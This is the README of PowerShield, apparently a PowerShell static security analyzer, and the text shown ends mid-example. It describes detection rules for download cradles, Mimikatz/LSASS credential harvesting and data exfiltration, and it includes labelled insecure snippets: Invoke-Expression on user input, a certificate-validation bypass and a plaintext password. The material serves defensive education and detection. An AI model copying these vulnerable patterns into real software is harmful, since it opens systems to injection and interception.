# PowerShield - Comprehensive PowerShell Security Platform

![GitHub Workflow Status](https://img.shields.io/github/actions/workflow/status/J-Ellette/PowerShield/powershell-security.yml?branch=main)
![License](https://img.shields.io/github/license/J-Ellette/PowerShield)
![Version](https://img.shields.io/badge/version-1.8.0-blue) <br>
[![PowerShield - PowerShell Security Analysis](https://github.com/J-Ellette/PowerShield/actions/workflows/powershell-security.yml/badge.svg)](https://github.com/J-Ellette/PowerShield/actions/workflows/powershell-security.yml) <br>
![Static Badge](https://img.shields.io/badge/Platform-Windows-blue) ![Static Badge](https://img.shields.io/badge/Platform-Linux-blue) ![Static Badge](https://img.shields.io/badge/Platform-macOS-blue) <br>
![Static Badge](https://img.shields.io/badge/Language-PowerShell-blue) ![Static Badge](https://img.shields.io/badge/Language-TypeScript-blue) ![Static Badge](https://img.shields.io/badge/Language-Dockerfile-blue)

**PowerShield** is a comprehensive security analysis platform for PowerShell scripts that integrates with GitHub Actions, provides AI-powered auto-fixes, and offers multiple deployment options.

## 📚 Version History & Evolution

PowerShield has evolved from a basic security analyzer to a comprehensive enterprise-grade security platform through 8 major releases. Each version added significant capabilities while maintaining backwards compatibility.

### v1.8.0 - Phase 2 Preparation & Advanced Detection (Current) 🚀

**Release Date**: October 2025  
**Focus**: VS Code foundation, secret detection, and performance benchmarking  
**[Documentation](docs/)**

**Key Features**:
- **VS Code Extension Foundation** 💻:
  - Language Server Protocol (LSP) integration for real-time analysis
  - Diagnostic export format (JSON-RPC 2.0)
  - Quick fix suggestions with confidence scoring
  - 7 VS Code commands schema
  - Module security validation (Test-ModuleSecurity)
  - **[Full Documentation](docs/VS_CODE_EXTENSION_FOUNDATION.md)**

- **Advanced Secret Detection** 🔐:
  - 30+ secret type patterns (AWS, Azure, GitHub, APIs, databases, OAuth, cryptocurrency)
  - Shannon entropy analysis for high-confidence detection
  - Detects: AWS keys, Azure keys, GitHub tokens, API keys, private keys, connection strings, JWT tokens, Slack/Stripe/Twilio tokens
  - Configurable confidence scoring and allowed secrets list
  - Workspace-wide scanning with progress reporting
  - **Successfully validated by PowerShield's own git hook!** ✅
  - **[Full Documentation](docs/ADVANCED_SECRET_DETECTION.md)**

- **Performance Benchmarking** 🔬:
  - Enterprise-grade benchmarking framework
  - Analysis speed metrics (files/sec, rules/sec, lines/sec)
  - Scalability testing (10 to 1000+ files)
  - Memory profiling (baseline, peak, per-file, leak detection)
  - Rule execution timing and performance ranking
  - Competitor comparison framework (PSScriptAnalyzer, DevSkim, Semgrep)
  - JSON/HTML/Markdown report formats
  - Performance targets: >100 files/sec, <1GB memory, <5% CI overhead
  - **[Full Documentation](docs/PERFORMANCE_BENCHMARKING.md)**

**Impact**: Establishes foundation for Phase 2 (VS Code extension) and enhances security with comprehensive secret detection.

---

### v1.7.0 - Security Hardening & Enterprise Migration 🛡️

**Release Date**: October 2025  
**Focus**: Production readiness, enterprise trust, and seamless migration  
**[Detailed Implementation Guide](docs/implementation/IMPLEMENTATION_v1.7.0.md)**

**Key Features**:
- **Security-First Architecture**: 
  - Comprehensive threat model with STRIDE analysis
  - Input validation module protecting against path traversal and injection attacks
  - Secure temporary file handling with restricted permissions
  - Protection against malicious script inputs
- **Secure-by-Default Configuration** (`.powershield.secure.yml`):
  - Conservative security thresholds (High severity minimum)
  - Auto-fix disabled by default (explicit opt-in required)
  - High confidence threshold (0.9 / 90%)
  - Short suppression expiry (30 days)
  - No permanent suppressions allowed
- **Enterprise Migration Tools**:
  - PSScriptAnalyzer migration utility with automatic rule mapping
  - Gap analysis reports showing coverage differences
  - Side-by-side comparison and suppression migration
- **ROI Calculator**: 
  - Business case justification with detailed cost-benefit analysis
  - Typical ROI: 89-245% with 3-4 month payback period
  - Calculates savings from reduced incidents and faster reviews
- **Enterprise Adoption Playbook**: 
  - Proven 30-90 day rollout strategy
  - Phase 1: Pilot (Days 1-30)
  - Phase 2: Department Rollout (Days 31-60)
  - Phase 3: Enterprise Deployment (Days 61-90)
- **Security Testing Suite**: Automated security tests for PowerShield itself

**Impact**: Establishes PowerShield as enterprise-ready with formal security assessment and migration support.

---

### v1.6.0 - CI/CD Foundation & Performance Optimization 🚀

**Release Date**: October 2025  
**Focus**: Universal CI/CD support and enterprise-scale performance  
**[Detailed Implementation Guide](docs/implementation/IMPLEMENTATION_v1.6.0.md)** | **[CI/CD Platform Guide](docs/implementation/IMPLEMENTATION_CI_CD_INTEGRATIONS.md)**

**Key Features**:
- **Universal Output Formats**:
  - JUnit XML for Jenkins, GitLab, CircleCI, Azure DevOps
  - TAP (Test Anything Protocol) for universal compatibility
  - CSV/TSV export for reporting and analytics
- **CI Adapter Interface**: 
  - Platform-agnostic integration layer
  - Support for 6 major platforms: GitHub Actions, Azure DevOps, GitLab, Jenkins, CircleCI, TeamCity
  - Automatic environment detection and git-based change discovery
- **Performance Optimization**:
  - Parallel file analysis with configurable thread pools
  - Incremental scanning (analyze only changed files)
  - Performance profiles: fast (3x faster), balanced, thorough
  - Analysis speed: >100 files/second
- **Enhanced Reporting**:
  - Standardized artifacts directory (`.powershield-reports/`)
  - Machine-readable run summaries with CI metadata
  - Enhanced PR/MR comments with rich formatting
- **Docker Container**: 
  - Alpine-based PowerShell container for consistent execution
  - Isolated analysis environment
- **Baseline Mode Enhancements**: 
  - Track only new violations
  - Filter out pre-existing issues
  - Focus on regression prevention

**Impact**: Enables PowerShield adoption across any CI/CD platform with production-grade performance.

---

### v1.5.0 - Comprehensive Azure Security ☁️

**Release Date**: October 2025  
**Focus**: Cloud security and advanced attack detection  

**Key Features**:
- **13 New Azure Security Rules** (Rules 34-46):
  - Azure PowerShell credential leaks detection
  - Azure resource exposure monitoring
  - Azure Entra ID (Azure AD) privileged operations
  - Azure data exfiltration detection
  - Azure logging and monitoring bypass detection
  - Azure subscription management security
  - Azure compute security violations
  - Azure DevOps security issues
  - Azure encryption bypass detection
  - Azure policy and compliance monitoring
- **Advanced PowerShell Detection**:
  - AMSI (Anti-Malware Scan Interface) evasion detection
  - ETW (Event Tracing for Windows) manipulation detection
  - Enhanced PowerShell 2.0 detection with bypass techniques
- **JEA & DSC Security** (Rules 46-48):
  - Just Enough Administration (JEA) configuration vulnerabilities
  - Desired State Configuration (DSC) security issues
  - Deprecated cmdlet usage detection
- **Total Rules**: 52 comprehensive security rules covering:
  - 4 Core rules
  - 20 PowerShell-specific rules
  - 3 Network rules
  - 4 File system rules
  - 3 Registry rules
  - 4 Data rules
  - 2 Evasion rules
  - 12 Azure rules

**Impact**: Industry-leading PowerShell security coverage with modern cloud and attack pattern detection.

---

### v1.4.0 - Enterprise Governance & Rule Marketplace 🎪

**Release Date**: October 2025  
**Focus**: Extensibility and community-driven rules  
**[Detailed Implementation Guide](docs/implementation/IMPLEMENTATION_RULE_MARKETPLACE.md)**

**Key Features**:
- **Rule Marketplace System**:
  - YAML-based custom rule definitions
  - 4 pattern types: Command, Regex, AST, Parameter-based
  - Community rule repository with quality certification
  - Rule templates and generator
- **Custom Rule Support**:
  - Load rules from `rules/custom/` directory
  - Community rules in `rules/community/`
  - Template rules in `rules/templates/`
- **CLI Rule Management**:
  ```bash
  psts rule create --template command
  psts rule validate my-rule.yml
  psts rule list --custom-only
  ```
- **Example Community Rules**:
  - Clear-Host detection
  - Write-Host usage detection
  - Hardcoded IP address detection
- **Integration**: Seamless integration with existing analyzer and all output formats

**Impact**: Enables community contributions and organization-specific security policies.

---

### v1.3.0 - Baseline & Compliance 📜

**Release Date**: October 2025  
**Focus**: Incremental security improvement and regulatory compliance  

**Key Features**:
- **Baseline & Diff Mode**:
  - Create versioned baselines with git metadata
  - Compare current state against baselines
  - Track only NEW violations (ignore pre-existing)
  - Export comparison reports in multiple formats
  - Team baseline sharing for collaborative security
- **Compliance Reporting**:
  - Support for 6 compliance frameworks:
    - NIST Cybersecurity Framework
    - CIS PowerShell Security Benchmark
    - OWASP Top 10 2021
    - SOC 2 requirements
    - PCI-DSS (Payment Card Industry Data Security Standard)
    - HIPAA Security Rules
- **Compliance Dashboard**:
  - Visual compliance status with percentage tracking
  - Gap analysis reports with remediation steps
  - Audit evidence collection
  - Policy enforcement tracking
- **CLI Commands**:
  ```bash
  psts baseline create
  psts baseline compare
  psts compliance dashboard
  psts compliance gap-analysis --framework NIST
  ```

**Impact**: Enables incremental security improvements and supports enterprise compliance requirements.

---

### v1.2.0 - Advanced Threat Detection 🛡️

**Release Date**: October 2025  
**Focus**: Real-world attack pattern detection  

**Key Features**:
- **6 Advanced Attack Rules** (Rules 47-52):
  - **PowerShellObfuscationDetection** (Critical): Base64 encoding, string concatenation, character code conversion
  - **DownloadCradleDetection** (Critical): IEX + web requests, memory-only execution patterns
  - **PersistenceMechanismDetection** (Critical): Registry Run keys, scheduled tasks, WMI events
  - **CredentialHarvestingDetection** (Critical): Mimikatz patterns, LSASS dumping, browser credentials
  - **LateralMovementDetection** (Critical): WMI/CIM execution, remote tasks, SMB enumeration
  - **DataExfiltrationDetection** (Critical): DNS tunneling, HTTP POST, cloud uploads
- **MITRE ATT&CK Mapping**: 
  - All attack rules mapped to MITRE ATT&CK framework
  - Technique IDs included in SARIF output
  - Real-world threat context
- **Pre-Commit Hooks**:
  - Local validation before commits
  - Block commits with critical violations
  - Configurable severity blocking
  - Auto-fix on commit (opt-in)
- **Total Rules**: 52 security rules with comprehensive attack coverage

**Impact**: Detects sophisticated real-world attacks beyond basic security mistakes.

---

### v1.1.0 - AI & Configuration Foundation 🤖

**Release Date**: October 2025  
**Focus**: Real AI integration and flexible configuration  
**[Detailed Implementation Guide](docs/implementation/IMPLEMENTATION_v1.1.0.md)**

**Key Features**:
- **Real AI Auto-Fix** (replacing mock implementation):
  - Multi-provider support:
    - GitHub Models API (free with GITHUB_TOKEN)
    - OpenAI (GPT-4, GPT-3.5)
    - Azure OpenAI
    - Anthropic Claude
  - Context-aware fix generation
  - Confidence scoring (0.0-1.0)
  - Template-based fallback
  - Fix validation and re-analysis
- **Configuration System** (`.powershield.yml`):
  - Hierarchical configuration: Default → Global → Project → Local
  - Comprehensive sections:
    - Analysis settings (thresholds, exclusions, timeouts)
    - Rule configuration (enable/disable, severity override)
    - Auto-fix settings (provider, model, confidence)
    - Suppression settings (justification, expiry)
    - Reporting configuration
    - CI/CD integration
  - Schema validation
- **Suppression Comment System**:
  - Multiple formats: next-line, inline, block
  - Expiry dates with automatic warnings
  - Required justification
  - Suppression audit reports
  - Example:
    ```powershell
    # POWERSHIELD-SUPPRESS-NEXT: InsecureHashAlgorithms - Legacy requirement (2025-12-31)
    $hash = Get-FileHash -Algorithm MD5 $file
    ```
- **Enterprise Webhooks**:
  - Slack integration with Block Kit
  - Microsoft Teams with Adaptive Cards
  - Custom webhook support
  - Event filtering and severity filtering
- **Pester Integration**:
  - Automated security testing
  - Fix validation pipeline
  - Auto-generated security tests

**Impact**: Transforms PowerShield from basic analyzer to intelligent, configurable security platform.

---

### v1.0.0 - Initial Release 🎉

**Release Date**: October 2025  
**Focus**: Core security analysis with GitHub Actions integration  
**[Implementation Summary](docs/implementation/IMPLEMENTATION_SUMMARY.md)** | **[Developer Guide](docs/implementation/copilot.md)**

**Key Features**:
- **Core Security Analyzer** (`src/PowerShellSecurityAnalyzer.psm1`):
  - AST (Abstract Syntax Tree) based analysis
  - Class-based PowerShell architecture
  - Single file and workspace analysis
  - Severity classification: Low, Medium, High, Critical
- **4 Core Security Rules**:
  1. **InsecureHashAlgorithms** (High): Detects MD5, SHA1, RIPEMD160 usage
  2. **CredentialExposure** (Critical): Finds plaintext password handling
  3. **CommandInjection** (Critical): Identifies unsafe Invoke-Expression
  4. **CertificateValidation** (High): Catches certificate validation bypasses
- **16 PowerShell-Specific Rules**:
  - Execution policy bypass
  - Script block logging disabled
  - Unsafe PowerShell remoting
  - Dangerous module imports
  - PowerShell version downgrade (PS v2)
  - Unsafe deserialization
  - Privilege escalation attempts
  - Script injection vulnerabilities
  - Unsafe reflection
  - Constrained mode issues
  - Unsafe file inclusion
  - PowerShell web requests without validation
- **GitHub Actions Workflow** (`.github/workflows/powershell-security.yml`):
  - Automated analysis on push, PR, manual trigger
  - SARIF upload to GitHub Security tab
  - PR comments with detailed results
  - Artifact uploads (JSON, SARIF, Markdown)
  - Test validation job
- **AI Auto-Fix Action** (`actions/copilot-autofix/`):
  - Rule-based fix generation
  - Confidence scoring
  - Automatic file modification
  - Preview mode
- **Supporting Scripts**:
  - `Convert-ToSARIF.ps1`: SARIF 2.1.0 converter
  - `Generate-SecurityReport.ps1`: Markdown report generator
- **Test Suite**: 28+ test scripts across 5 categories (PowerShell, Network, Filesystem, Registry, Data)

**Impact**: Established foundation for comprehensive PowerShell security analysis with GitHub integration.

---

## 🔄 Migration Between Versions

For organizations upgrading from earlier versions, we provide comprehensive migration guides:

- **[General Migration Guide](docs/MIGRATION_GUIDE.md)**: Version-to-version upgrade instructions
- **[PSScriptAnalyzer Migration](tools/Migrate-FromPSScriptAnalyzer.ps1)**: Migrate from Microsoft PSScriptAnalyzer
- **[Configuration Migration](docs/CONFIGURATION_GUIDE.md)**: Update configurations for new features

**Backwards Compatibility Policy**:
- Minimum PowerShell version: 7.0
- Configuration versions: 1.0 (current and supported)
- Deprecation timeline: 12-month notice for breaking changes
- Legacy configuration support during transition periods

## 🎯 Features

### Phase 1: GitHub Workflow Integration ✅
- **Automated Security Analysis**: Runs on every push and pull request
- **52 Security Rules**: Comprehensive PowerShell security coverage
  - **Core Rules (4)**: Insecure hashing, credential exposure, command injection, certificate validation
  - **PowerShell-Specific Rules (42)**: Execution policy bypass, unsafe remoting, version downgrades, privilege escalation, and more
  - **Advanced Attack Detection (6)**: Obfuscation, download cradles, persistence, credential harvesting, lateral movement, data exfiltration
- **Custom Rules & Community Marketplace** 🎪: Extensible YAML-based custom rules
  - **YAML Rule Definitions**: Simple format for creating security rules
  - **4 Pattern Types**: Command, regex, AST, and parameter-based detection
  - **Rule Templates**: Quick-start templates for common rule types
  - **CLI Tools**: Validate, list, and manage custom rules
  - **Community Rules**: Pre-built rules from the community
- **SARIF Output**: Integrates with GitHub Security tab
- **AI-Powered Auto-Fix**: Automatically generates and applies security fixes with multiple AI providers
- **Configuration System**: Flexible YAML-based configuration with hierarchical support
- **Suppression Comments**: Document and track security exceptions with expiry dates
- **Pre-Commit Hooks**: Local validation before commits with configurable blocking
- **Baseline & Diff Mode** 📸: Track new violations and baseline versioning
  - Create versioned baselines with git metadata
  - Compare current state against baselines
  - Export comparison reports
  - Team baseline sharing
- **Compliance Reporting** 📜: Enterprise governance and compliance
  - 6 compliance frameworks (NIST, CIS, OWASP, SOC 2, PCI-DSS, HIPAA)
  - Compliance dashboard with percentage tracking
  - Gap analysis reports with remediation steps
  - Audit evidence collection
- **CLI Tools**: Command-line interface for analysis, configuration, baseline, compliance, and hook management
- **PR Comments**: Detailed analysis results posted to pull requests
- **Human-Readable Reports**: Markdown reports with actionable recommendations
- **Enterprise Integrations**: Webhook notifications and Pester security testing
- **Security Hardening** 🛡️ **(NEW v1.7)**: Enterprise-grade security features
  - Comprehensive threat model with STRIDE analysis
  - Input validation protecting against path traversal and injection attacks
  - Secure-by-default configuration template
  - Security testing suite for PowerShield itself
- **Enterprise Migration Toolkit** 🏢 **(NEW v1.7)**: Seamless adoption tools
  - PSScriptAnalyzer migration utility with automatic rule mapping
  - ROI calculator with business case justification
  - 30-90 day enterprise adoption playbook
  - Proof-of-concept program materials

### Coming Soon
- **Phase 2**: VS Code Extension with real-time analysis
- **Phase 3**: Standalone desktop application with Docker isolation

## 🚀 Quick Start

### 1. Add to Your Repository

Create `.github/workflows/powershell-security.yml`:

```yaml
name: PowerShell Security Analysis

on: [push, pull_request]

permissions:
  contents: read
  security-events: write
  pull-requests: write

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
    
    - name: Run PowerShield Analysis
      shell: pwsh
      run: |
        Import-Module ./src/PowerShellSecurityAnalyzer.psm1 -Force
        $result = Invoke-WorkspaceAnalysis -WorkspacePath "."
        
        # Export results
        $result | ConvertTo-Json -Depth 10 | Out-File 'powershield-results.json'
        
        # Generate SARIF
        . ./scripts/Convert-ToSARIF.ps1
        Convert-ToSARIF -InputFile 'powershield-results.json' -OutputFile 'powershield-results.sarif'
    
    - name: Upload SARIF
      uses: github/codeql-action/upload-sarif@v3
      with:
        sarif_file: powershield-results.sarif
```

### 2. Analyze Local Scripts

```powershell
# Import the analyzer
Import-Module ./src/PowerShellSecurityAnalyzer.psm1

# Analyze a single script
$result = Invoke-SecurityAnalysis -ScriptPath "./MyScript.ps1"

# View violations
$result.Violations | Format-Table RuleId, Severity, LineNumber, Message

# Analyze entire workspace
$workspaceResult = Invoke-WorkspaceAnalysis -WorkspacePath "."
Write-Host "Total violations: $($workspaceResult.TotalViolations)"

# Enable suppressions
$result = Invoke-SecurityAnalysis -ScriptPath "./MyScript.ps1" -EnableSuppressions
```

### 3. Use CLI Tools

PowerShield includes a comprehensive command-line interface (`psts`) for local development:

```bash
# Quick start - Interactive mode
./psts interactive

# Analyze files
./psts analyze ./scripts
./psts analyze --format sarif --output results.sarif

# Baseline management - Track new issues
./psts baseline create                              # Create baseline
./psts baseline create --description "Release 1.0"  # With description
./psts baseline compare                             # Compare with baseline
./psts baseline list                                # List all baselines
./psts baseline export --format html                # Export comparison report
./psts baseline share --team "DevOps"               # Share with team

# Compliance reporting - Enterprise governance
./psts compliance dashboard                         # Show all frameworks
./psts compliance assess --framework NIST           # Assess specific framework
./psts compliance gap-analysis --framework PCI-DSS  # Generate gap analysis
./psts compliance audit                             # Export audit evidence

# Fix management - Preview and apply security fixes
./psts fix preview
./psts fix apply --confidence 0.8

# Configuration
./psts config validate
./psts config init
./psts config show

# Install pre-commit hook
./psts install-hooks

# Show help
./psts help
```

**Alternative invocation (if `./psts` doesn't work):**
```bash
pwsh psts.ps1 <command> [options]
```

### 4. Enable Pre-Commit Hooks

Get immediate feedback before committing:

```bash
# Install the hook
./psts install-hooks

# Now commits are automatically checked
git add script.ps1
git commit -m "Add script"
# Hook runs automatically and blocks if violations found
```

Configure hook behavior in `.powershield.yml`:

```yaml
hooks:
  enabled: true
  block_on: ["Critical", "High"]  # Block commits with these severities
  auto_fix: false
```

See [Pre-Commit Hook Guide](docs/PRE_COMMIT_HOOK_GUIDE.md) for details.

## 🛠️ PowerShield CLI Reference

The PowerShield CLI provides comprehensive security analysis tools:

### Analysis Commands

```bash
# Analyze current directory
./psts analyze

# Analyze specific path
./psts analyze ./src

# Output formats
./psts analyze --format json --output results.json
./psts analyze --format sarif --output results.sarif
./psts analyze --format markdown --output report.md

# Compare with baseline
./psts analyze --baseline .powershield-baseline.json
```

### Baseline Management

Track new violations over time:

```bash
# Create baseline from current state
./psts baseline create

# Create baseline for specific path
./psts baseline create ./src

# Compare current state with baseline
./psts baseline compare

# Custom baseline file
./psts baseline create --output custom-baseline.json
./psts baseline compare --output custom-baseline.json
```

### Fix Management

Preview and apply security fixes:

```bash
# Preview available fixes
./psts fix preview

# Preview with higher confidence threshold
./psts fix preview --confidence 0.9

# Apply fixes (requires AI configuration)
./psts fix apply --confidence 0.8
```

### Configuration Management

```bash
# Validate current configuration
./psts config validate

# Show current configuration (JSON)
./psts config show

# Create default configuration file
./psts config init
```

### Interactive Mode

Run PowerShield with guided prompts:

```bash
# Start interactive mode
./psts interactive

# Or just run without arguments
./psts
```

Interactive mode provides a menu-driven interface for:
- Running security analysis
- Creating and managing baselines
- Previewing fixes
- Configuring PowerShield
- Installing pre-commit hooks

## 📖 Documentation

### User Guides
- **[CLI Usage Guide](docs/CLI_USAGE_GUIDE.md)** - Complete reference for the PowerShield command-line interface
- **[Configuration Guide](docs/CONFIGURATION_GUIDE.md)** - Configure PowerShield with `.powershield.yml`
- **[AI Auto-Fix Guide](docs/AI_AUTOFIX_GUIDE.md)** - Setup and use AI-powered fixes
- **[Suppression Guide](docs/SUPPRESSION_GUIDE.md)** - Document security exceptions
- **[Pre-Commit Hook Guide](docs/PRE_COMMIT_HOOK_GUIDE.md)** - Local validation before commits
- **[Baseline Guide](docs/BASELINE_GUIDE.md)** - Track new violations with baseline mode
- **[Compliance Frameworks](docs/COMPLIANCE_FRAMEWORKS.md)** - Enterprise compliance reporting
- **[Migration Guide](docs/MIGRATION_GUIDE.md)** - Upgrade between PowerShield versions

### Security & Attack Detection
- **[Advanced Attack Detection](docs/ADVANCED_ATTACK_DETECTION.md)** - Security rules and patterns reference
- **[Threat Model](docs/THREAT_MODEL.md)** 🛡️ - Security architecture and threat analysis
- **[Enhanced SARIF Output](docs/Enhanced-SARIF-Output.md)** - SARIF 2.1.0 integration details

### Enterprise Resources
- **[Enterprise Adoption Playbook](docs/ENTERPRISE_ADOPTION_PLAYBOOK.md)** 🏢 - 30-90 day rollout guide
- **[CI/CD Integration Guide](docs/CI_CD_INTEGRATION.md)** 🔄 - Multi-platform CI/CD setup
- **[Output Formats](docs/OUTPUT_FORMATS.md)** - JUnit, TAP, CSV, SARIF formats
- **[Performance Implementation](docs/PERFORMANCE_IMPLEMENTATION.md)** - Optimization strategies
- **[Quality Management Framework](docs/QUALITY_MANAGEMENT_FRAMEWORK.md)** 📊 - Technical debt & quality control
- **[Market Positioning Strategy](docs/MARKET_POSITIONING_STRATEGY.md)** 📈 - Competitive analysis & go-to-market

### Developer Resources
- **[Rule Marketplace](docs/RULE_MARKETPLACE.md)** 🎪 - Create custom security rules
- **[Webhook Integration](docs/webhook-integration.md)** - Slack, Teams notifications
- **[Pester Integration](docs/pester-integration.md)** - Security testing framework

### Implementation Guides
- **[Phase 1 Implementation Summary](docs/implementation/IMPLEMENTATION_SUMMARY.md)** - v1.0.0 overview
- **[v1.1.0 Implementation](docs/implementation/IMPLEMENTATION_v1.1.0.md)** - AI & Configuration
- **[v1.6.0 Implementation](docs/implementation/IMPLEMENTATION_v1.6.0.md)** - CI/CD Foundation
- **[v1.7.0 Implementation](docs/implementation/IMPLEMENTATION_v1.7.0.md)** - Security Hardening
- **[CI/CD Platform Integrations](docs/implementation/IMPLEMENTATION_CI_CD_INTEGRATIONS.md)** - Platform-specific guides
- **[Rule Marketplace Implementation](docs/implementation/IMPLEMENTATION_RULE_MARKETPLACE.md)** - Custom rules system
- **[Developer Implementation Guide](docs/implementation/copilot.md)** - Architecture and development

### Configuration Templates
- **[Example Configuration](.powershield.yml.example)** - Complete configuration template
- **[Secure Configuration](.powershield.secure.yml)** - Production-ready secure defaults

## 🏢 Enterprise Features (NEW v1.7)

### Migration from PSScriptAnalyzer

Seamlessly migrate from PSScriptAnalyzer to PowerShield with automatic configuration conversion:

```powershell
# Migrate existing PSScriptAnalyzer configuration
./tools/Migrate-FromPSScriptAnalyzer.ps1 -ConfigPath ./PSScriptAnalyzerSettings.psd1 -GenerateReport

# Preview migration without writing files
./tools/Migrate-FromPSScriptAnalyzer.ps1 -DryRun

# Migrate rules only
./tools/Migrate-FromPSScriptAnalyzer.ps1 -RulesOnly -Output .powershield.yml
```

**Features**:
- Automatic rule mapping with confidence ratings
- Gap analysis report showing coverage differences
- PowerShield exclusive features highlighted
- Side-by-side comparison
- Suppression migration guidance

See [Migration Tool Documentation](tools/Migrate-FromPSScriptAnalyzer.ps1) for details.

### ROI Calculator

Build business case for PowerShield adoption with comprehensive ROI analysis:

```powershell
# Interactive mode
./tools/Calculate-PowerShieldROI.ps1 -Interactive

# With parameters
./tools/Calculate-PowerShieldROI.ps1 -TeamSize 10 -MonthlySecurityReviewHours 40 -OutputFormat text

# Generate JSON report
./tools/Calculate-PowerShieldROI.ps1 -OutputFormat json -OutputFile roi-report.json
```

**Calculates**:
- Current costs (manual reviews, incidents, delays)
- PowerShield implementation costs
- Time savings (87% reduction in manual reviews)
- Risk reduction (90% of preventable incidents)
- ROI metrics (typically 89-245%)
- Payback period (typically 3-4 months)

**Example Output**:
```
╔═══════════════════════════════════════════════════════╗
║         PowerShield ROI Analysis                      ║
╚═══════════════════════════════════════════════════════╝

CURRENT STATE: $181,000/year
  Manual Reviews: $72,000
  Security Incidents: $100,000
  Delayed Releases: $75,000

WITH POWERSHIELD:
  First Year Cost: $23,800
  Annual Savings: $160,000
  Net Benefit: $136,200
  ROI: 89% (first year), 245% (ongoing)
  Payback: 3.2 months
```

### Enterprise Adoption Playbook

Proven 30-90 day rollout strategy for enterprise-wide adoption:

**Phase 1: Pilot (Days 1-30)**
- Select 1-2 teams (5-10 developers)
- Initial setup and configuration
- Baseline analysis and tuning
- Feedback collection

**Phase 2: Department Rollout (Days 31-60)**
- Expand to full department (20-50 developers)
- Security champions program
- Team-specific configurations
- Training and documentation

**Phase 3: Enterprise Deployment (Days 61-90)**
- Deploy to all engineering teams
- Centralized governance
- Enterprise tool integration
- Executive reporting

See [Enterprise Adoption Playbook](docs/ENTERPRISE_ADOPTION_PLAYBOOK.md) for complete guide.

### Secure-by-Default Configuration

Production-ready security configuration template:

```powershell
# Use secure defaults for enterprise
cp .powershield.secure.yml .powershield.yml
```

**Features**:
- High severity threshold (conservative)
- All security rules enabled
- Auto-fix disabled by default (explicit opt-in required)
- High confidence threshold (0.9 / 90%)
- Short suppression expiry (30 days)
- Strict justification requirements
- No permanent suppressions allowed
- Comprehensive audit logging

**Perfect for**:
- Production environments
- Regulated industries (finance, healthcare, government)
- Security-first organizations
- Compliance requirements (SOC 2, PCI-DSS, HIPAA)

### Security Architecture & Threat Model

Comprehensive security documentation for enterprise trust:

**Threat Analysis**:
- ✅ Malicious scripts targeting analyzer (MITIGATED)
- ✅ Configuration file tampering (MITIGATED)
- ⚠️ Supply chain attacks (MONITORED)
- ✅ Privilege escalation attempts (MITIGATED)
- ✅ Data exfiltration risks (MITIGATED)

**Security Controls**:
- Input validation for all external inputs
- Path traversal protection
- No code execution (AST parsing only)
- Resource limits (file size, timeout, path depth)
- Secure temporary file handling
- Comprehensive audit logging

See [Threat Model Documentation](docs/THREAT_MODEL.md) for complete analysis.

## 🔧 Configuration

PowerShield supports flexible configuration through `.powershield.yml` files:

```yaml
# .powershield.yml
version: "1.0"

analysis:
  severity_threshold: "High"
  exclude_paths:
    - "vendor/**"
    - "build/**"

rules:
  InsecureHashAlgorithms:
    enabled: true
    severity: "High"
  
  CommandInjection:
    enabled: true
    severity: "Critical"

autofix:
  enabled: true
  provider: "github-models"  # Free with GITHUB_TOKEN
  model: "gpt-4o-mini"
  confidence_threshold: 0.8
  fallback_to_templates: true

suppressions:
  require_justification: true
  max_duration_days: 90
  allow_permanent: false

hooks:
  enabled: true
  block_on: ["Critical", "High"]
```

**Configuration Hierarchy** (later overrides earlier):
1. Default configuration
2. Global: `~/.powershield.yml`
3. Project: `.powershield.yml`
4. Local: `.powershield.local.yml`

See [Configuration Guide](docs/CONFIGURATION_GUIDE.md) for details.

## 🤖 AI Auto-Fix

PowerShield can automatically fix security violations using AI:

### Supported Providers

| Provider | Setup | Cost |
|----------|-------|------|
| GitHub Models | Uses `GITHUB_TOKEN` | Free tier |
| OpenAI | `OPENAI_API_KEY` | Pay per use |
| Azure OpenAI | Azure credentials | Enterprise |
| Anthropic Claude | `ANTHROPIC_API_KEY` | Pay per use |
| Template-based | No setup | Free (fallback) |

### Usage

```yaml
# In GitHub Actions
- name: Auto-Fix Violations
  uses: ./actions/copilot-autofix
  with:
    github-token: ${{ secrets.GITHUB_TOKEN }}
    violations-file: powershield-results.json
    apply-fixes: true  # or false for preview
```

```powershell
# Command line preview
node actions/copilot-autofix/dist/index.js \
  --violations-file powershield-results.json \
  --apply-fixes false
```

See [AI Auto-Fix Guide](docs/AI_AUTOFIX_GUIDE.md) for complete setup.

## 🔕 Suppression Comments

Document and track security exceptions with suppression comments:

```powershell
# POWERSHIELD-SUPPRESS-NEXT: InsecureHashAlgorithms - Legacy system requirement
$hash = Get-FileHash -Path "file.txt" -Algorithm MD5

# Inline suppression
$password = "test" # POWERSHIELD-SUPPRESS: CredentialExposure - Test credential

# Block suppression
# POWERSHIELD-SUPPRESS-START: CommandInjection - Validated input only
Invoke-Expression $validatedCommand
# POWERSHIELD-SUPPRESS-END

# With expiry date
# POWERSHIELD-SUPPRESS-NEXT: InsecureHashAlgorithms - Until migration (2025-12-31)
$hash = Get-FileHash -Algorithm SHA1 "data.bin"
```

### Features

- **Multiple formats**: Next-line, inline, and block
- **Expiry dates**: Automatic expiration with warnings
- **Justification required**: Enforce documentation
- **Audit reports**: Track all suppressions

```powershell
# Enable in analysis
$result = Invoke-SecurityAnalysis -ScriptPath "script.ps1" -EnableSuppressions
```

See [Suppression Guide](docs/SUPPRESSION_GUIDE.md) for syntax details.

## 📋 Security Rules

### 1. Insecure Hash Algorithms
**Severity**: High  
**Description**: Detects usage of MD5, SHA1, and other cryptographically weak algorithms

**Example Violation**:
```powershell
# ❌ Bad - Uses insecure MD5
$hash = Get-FileHash -Path "file.txt" -Algorithm MD5

# ✅ Good - Uses secure SHA256
$hash = Get-FileHash -Path "file.txt" -Algorithm SHA256
```

### 2. Credential Exposure
**Severity**: Critical  
**Description**: Detects plaintext credential handling

**Example Violation**:
```powershell
# ❌ Bad - Plaintext password
$password = ConvertTo-SecureString "Password123" -AsPlainText -Force

# ✅ Good - Secure password input
$password = Read-Host "Enter password" -AsSecureString
```

### 3. Command Injection
**Severity**: Critical  
**Description**: Detects unsafe use of Invoke-Expression with variables

**Example Violation**:
```powershell
# ❌ Bad - Command injection risk
$userInput = Read-Host "Enter command"
Invoke-Expression $userInput

# ✅ Good - Use safer alternatives
& { Get-Process }
```

### 4. Certificate Validation
**Severity**: High  
**Description**: Detects certificate validation bypasses

**Example Violation**:
```powershell
# ❌ Bad - Bypasses certificate validation
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

# ✅ Good - Implement proper validation
